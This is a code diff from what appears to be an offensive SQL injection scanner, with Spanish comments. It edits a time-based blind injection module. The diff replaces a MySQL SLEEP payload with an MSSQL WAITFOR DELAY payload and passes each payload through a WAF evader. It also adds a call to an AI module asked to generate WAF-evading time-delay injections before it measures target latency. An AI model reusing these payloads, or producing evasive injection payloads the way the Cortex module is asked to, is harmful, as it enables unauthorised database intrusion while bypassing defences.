@@ -15,12 +15,33 @@ class VectorTime(BaseVector):
     async def run(self, context: Dict[str, Any]) -> Dict[str, Any]:
         logger.info(f"[*] Native Engine: Iniciando Vector Time-based sobre {self.target_url}")
         
-        # Instanciar el evasor dinámico
+        # Instanciar el evasor
         evader = PayloadEvader(context.get("aggressiveness", 3))
         
         delay_seconds = 5
-        # Payload de prueba mutado dinámicamente
-        payload_time = evader.evade(f" AND (SELECT * FROM (SELECT(SLEEP({delay_seconds})))Cerberus)")
+        base_time = " WAITFOR DELAY '0:0:5'"
+        
+        # Integrate AI Smart Payloads if omni context allows
+        if context.get("force_ai_payloads", True):
+            try:
+                from backend.core.cortex_ai import generate_smart_payloads
+                logger.debug(f"[Time] Invocando Cortex AI (WAF: {context.get('waf_type', 'Auto')}) para generar paquete de ataques de latencia avanzados...")
+                ai_ctx = {
+                    "vector": "Time", 
+                    "url": self.target_url, 
+                    "parameter": "id",
+                    "waf_type": context.get("waf_type", "general_strong")
+                }
+                # Request 1 time-delay payload with 5 seconds
+                smart_p = await generate_smart_payloads(ai_ctx, "Generar inyecciones Time-based (Múltiples motores: sleep, pg_sleep, waitfor) con latencia de 5s, evadiendo WAF.", target_count=1)
+                if smart_p and len(smart_p) >= 1:
+                    base_time = smart_p[0]
+                    logger.info(f"[*] Native Engine (AI): Paquete de latencia aplicado. Payload={base_time[:25]}...")
+            except Exception as e:
+                logger.warning(f"[Time] Paquete de ataques IA falló, usando heurística local. Error: {e}")
+
+        # Payload base de tiempo (5 segundos) mutado dinámicamente
+        payload_time = evader.evade(base_time)
         
         # 1. Medición de Latencia Base
         base_latencies = []
@@ -38,7 +59,7 @@ class VectorTime(BaseVector):
         logger.debug(f"[Time] Baseline Latency Avg: {avg_base:.2f}s")
         
         # 2. Inyección de Retardo
-        url_delay = f"{self.target_url}{payload_time}"
+        url_delay = self.inject_url(payload_time)
         t0 = time.time()
         resp_delay = await self._safe_get(url_delay)
         t1 = time.time()
